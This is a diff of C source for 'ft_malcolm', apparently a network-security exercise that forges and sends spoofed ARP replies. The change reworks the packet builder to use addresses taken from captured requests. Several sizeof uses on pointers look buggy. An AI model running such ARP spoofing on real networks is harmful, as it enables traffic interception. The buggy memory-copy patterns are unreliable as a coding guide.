@@ -101,22 +101,24 @@ void		sig_handler(int num_sig)
 	}
 }
 
-t_arp_packet	*build_pkt(t_env *env, bool rev)
+t_arp_packet	*build_pkt(uint32_t *spa, uint32_t *tpa, unsigned char *tha, bool rev)
 {
 	t_arp_packet *pkt;
+	t_mac empty_mac;
 
+	ft_bzero(&empty_mac, sizeof(empty_mac));
 	if ((pkt = (t_arp_packet *)malloc(sizeof(t_arp_packet))) == NULL)
 		return (NULL);
 	ft_bzero(pkt, sizeof(pkt));
 	if (rev == false)
 	{
-		ft_memcpy(pkt->targ_hw_addr, env->target_mac->bytes, sizeof(env->target_mac->bytes));
-		ft_memcpy(pkt->src_hw_addr, env->source_mac->bytes, sizeof(env->source_mac->bytes));
+		ft_memcpy(pkt->targ_hw_addr, tha, sizeof(tha));
+		ft_memcpy(pkt->src_hw_addr, &empty_mac, sizeof(empty_mac));
 	}
 	else
 	{
-		ft_memcpy(pkt->src_hw_addr, env->target_mac->bytes, sizeof(env->target_mac->bytes));
-		ft_memcpy(pkt->targ_hw_addr, env->source_mac->bytes, sizeof(env->source_mac->bytes));
+		ft_memcpy(pkt->src_hw_addr, tha, sizeof(tha));
+		ft_memcpy(pkt->targ_hw_addr, &empty_mac, sizeof(empty_mac));
 	}
 	pkt->frame_type     = htons(0x0806);
 	pkt->hw_type        = htons(1);
@@ -126,19 +128,17 @@ t_arp_packet	*build_pkt(t_env *env, bool rev)
 	pkt->op             = htons(ARPOP_REPLY);
 	if (rev == false)
 	{
-		pkt->source_ip = env->source_ip->sin_addr.s_addr;
-		ft_memcpy(pkt->source_mac, env->source_mac->bytes, sizeof(env->source_mac->bytes));
-		pkt->target_ip = env->target_ip->sin_addr.s_addr;
-		ft_memcpy(pkt->target_mac, env->target_mac->bytes, sizeof(env->target_mac->bytes));
+		pkt->source_ip = *spa;
+		ft_memcpy(pkt->source_mac, &empty_mac, sizeof(empty_mac));
+		pkt->target_ip = *tpa;
+		ft_memcpy(pkt->target_mac, tha, sizeof(tha));
 	}
 	else
 	{
-		pkt->source_ip = env->target_ip->sin_addr.s_addr;
-		ft_memcpy(pkt->source_mac, env->source_mac->bytes, sizeof(env->source_mac->bytes));
-		pkt->target_ip = env->source_ip->sin_addr.s_addr;
-		t_mac empty_mac;
-		ft_bzero(&empty_mac, sizeof(empty_mac));
-		ft_memcpy(pkt->target_mac, &empty_mac, sizeof(env->target_mac->bytes));
+		pkt->source_ip = *tpa;
+		ft_memcpy(pkt->source_mac, &empty_mac, sizeof(empty_mac));
+		pkt->target_ip = *spa;
+		ft_memcpy(pkt->target_mac, &empty_mac, sizeof(tha));
 	}
 	ft_bzero(pkt->padding, 18);
 	return (pkt);
@@ -179,10 +179,6 @@ int			ft_malcolm(t_env *env)
 						arp_frame->arp_sha[0], arp_frame->arp_sha[1], arp_frame->arp_sha[2], arp_frame->arp_sha[3], arp_frame->arp_sha[4], arp_frame->arp_sha[5],
 						arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
 						arp_frame->arp_tha[0], arp_frame->arp_tha[1], arp_frame->arp_tha[2], arp_frame->arp_tha[3], arp_frame->arp_tha[4], arp_frame->arp_tha[5]);
-					if (env->specific == false)
-					{
-						ft_memcpy(&env->source_ip->sin_addr.s_addr, arp_frame->arp_tpa, sizeof(arp_frame->arp_tpa));
-					}
 					if (g_stop == false)
 					{
 						recv(env->sock_fd, buf, buf_size, 0);
@@ -217,10 +213,10 @@ int			ft_malcolm(t_env *env)
 			return (-1);
 		printf("Sending spoofed ARP reply with ip %u.%u.%u.%u - mac %02x:%02x:%02x:%02x:%02x:%02x\n\t\t\t\tfor ip %u.%u.%u.%u - mac %02x:%02x:%02x:%02x:%02x:%02x\n",
 			arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
-			env->target_mac->bytes[0], env->target_mac->bytes[1], env->target_mac->bytes[2], env->target_mac->bytes[3], env->target_mac->bytes[4], env->target_mac->bytes[5],
+			arp_frame->arp_tha[0], arp_frame->arp_tha[1], arp_frame->arp_tha[2], arp_frame->arp_tha[3], arp_frame->arp_tha[4], arp_frame->arp_tha[5],
 			arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
 			0, 0, 0, 0, 0, 0);
-		if ((pkt = build_pkt(env, false)) == NULL)
+		if ((pkt = build_pkt((uint32_t *)arp_frame->arp_spa, (uint32_t *)arp_frame->arp_tpa, arp_frame->arp_tha, false)) == NULL)
 		{
 			close(env->sock_fd);
 			return (-1);
@@ -238,10 +234,10 @@ int			ft_malcolm(t_env *env)
 		{
 			printf("Sending spoofed ARP reply with ip %u.%u.%u.%u - mac %02x:%02x:%02x:%02x:%02x:%02x\n\t\t\t\tfor ip %u.%u.%u.%u - mac %02x:%02x:%02x:%02x:%02x:%02x\n",
 				arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
-				env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5],
+				arp_frame->arp_tha[0], arp_frame->arp_tha[1], arp_frame->arp_tha[2], arp_frame->arp_tha[3], arp_frame->arp_tha[4], arp_frame->arp_tha[5],
 				arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
 				0, 0, 0, 0, 0, 0);
-			if ((pkt = build_pkt(env, true)) == NULL)
+			if ((pkt = build_pkt((uint32_t *)arp_frame->arp_tpa, (uint32_t *)arp_frame->arp_spa, arp_frame->arp_tha, true)) == NULL)
 			{
 				close(env->sock_fd);
 				return (-1);
